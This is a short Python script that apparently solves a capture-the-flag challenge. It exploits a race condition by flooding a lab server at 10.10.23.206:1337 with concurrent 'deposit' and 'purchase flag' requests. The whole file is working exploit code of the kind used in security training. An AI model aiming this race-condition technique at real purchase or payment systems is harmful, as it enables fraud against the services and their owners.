import socket
import threading

def send_request(command):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the server at IP '10.10.23.206' and port 1337
        sock.connect(('10.10.23.206', 1337))  
        # Send the command to the server (encoded as bytes)
        sock.sendall(command.encode())  
        # Receive the response from the server (up to 1024 bytes)
        response = sock.recv(1024) 
        # Print the response after decoding it from bytes to string 
        print(response.decode())  
        # Close the socket connection
        sock.close()  
    except Exception as e:
        print(f"Error: {str(e)}")

def run_concurrent_operations():
    # The commands to be sent to the server
    deposit = "deposit"  
    flag = "purchase flag"  
    for i in range(1, 1000):
        # Create a new thread with the send_request function as the target
        t1 = threading.Thread(target=send_request, args=(deposit,)) 
        t2 = threading.Thread(target=send_request, args=(flag,))  
        # Start the thread, allowing it to run concurrently with other threads
        t1.start()  
        t2.start()
    # Wait for all the threads to finish before moving forward
    t1.join()  
    t2.join()

# Call the run_concurrent_operations function to execute the program
run_concurrent_operations()  
